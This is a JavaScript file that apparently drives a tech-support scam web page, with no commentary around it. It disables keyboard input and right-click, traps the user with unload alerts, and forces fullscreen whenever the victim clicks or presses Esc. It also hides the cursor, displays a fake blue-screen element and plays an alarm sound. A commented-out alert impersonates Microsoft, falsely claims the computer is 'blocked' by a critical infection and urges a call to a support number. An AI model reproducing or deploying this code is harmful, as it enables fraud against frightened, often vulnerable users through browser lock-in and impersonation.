window.onkeydown = function(evt){ return false;};
window.onkeypress = function(evn){ return false;};
onbeforeunload=function() { alert ("??????? ESC, ????? ??????? ????????!"); return "??????? ESC, ????? ??????? ????????!";}
document.oncontextmenu=new Function("return false");

for(var _i=0;_i<2;_i++){
	 
}

function newLine(){
	
	//document.getElementById("light-screen").style.display="none";
	document.getElementById("blue-screen").style.display="block";
	document.getElementsByTagName("body").item(0).setAttribute('class','past');
}


function toggleFullScreen()
{
	if (!document.fullscreenElement &&  !document.mozFullScreenElement && !document.webkitFullscreenElement)
	{
		if (document.documentElement.requestFullscreen)
		{
			document.documentElement.requestFullscreen();

		}
		else if (document.documentElement.mozRequestFullScreen)
		{
			document.documentElement.mozRequestFullScreen();

		}
		else if (document.documentElement.webkitRequestFullscreen)
		{
			document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
		}
	}
	openBrowser();
}

document.addEventListener('keyup', function(es)
{
	if (es.keyCode == 27)
	{
		toggleFullScreen();

	}
}
, false);
document.addEventListener('keyup', function(e)
{
	if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13)
	{
		newLine();
		toggleFullScreen();

	}
}
, false);

window.onload = function ()
{
	document.onclick = function (e)
	{
		
		e = e || event;
		target = e.target || e.srcElement;
		if (target.tagName == "DIV")
		{
			toggleFullScreen();
			document.body.style.cursor = 'none';
			newLine();
		}
		else
		{
			toggleFullScreen();
			document.body.style.cursor = 'none';
			newLine();
		}

	}
}

addEventListener("click", function() {
	newLine();
	var
			el = document.documentElement
			, rfs =
					el.requestFullScreen
					|| el.webkitRequestFullScreen
					|| el.mozRequestFullScreen
			;

	rfs.call(el);

});

window.addEventListener('resize', function(){
  $("body").css('overflow','hidden');
  $(".popup-alert").stop().animate({bottom:'-10px', opacity:1},500);
  document.getElementById("play").play();
  if(screen.width === window.innerWidth){}
  /*setTimeout(function(){  
  setInterval(function () { alert("Your computer is in blocked state.\nSYSTEM WARNING :\nDO NOT PRESS ANY KEY UNTIL YOU KNOW SAFE SIDE INSTRUCTIONS.\n For saftey instructions immediately call on the support number , a Microsoft Super Technician is waiting to guide you to safeguard your system.\nYou must not avoid this warning , as this is a very critical infection.\nMicrosoft Super Technicians are level 9 technicians which are expertise in resolving these kind of issues.\nTHIS CALL IS A TOLL FREE CALL. "+_number) }, 0000);
  },1000);*/
  window.setInterval(function(){
    for(var i=0;i<100;i++)
    {
     	 
    
    }
}, 500);

});